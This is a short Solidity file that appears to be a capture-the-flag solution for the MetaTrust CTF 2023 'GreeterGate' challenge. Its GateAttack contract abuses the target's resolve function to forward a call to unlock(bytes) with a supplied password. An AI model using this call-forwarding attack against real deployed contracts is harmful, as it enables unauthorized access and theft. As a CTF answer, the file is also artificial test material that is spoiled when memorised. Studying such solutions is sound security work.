// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/MetaTrustCTF_2023/GreeterGate/Gate.sol";

contract GateAttack {

    function attack(address target, bytes memory password) public {
	    Gate g = Gate(target);
        bytes memory data = abi.encodeWithSignature("unlock(bytes)", password);
        g.resolve(data);
    }

}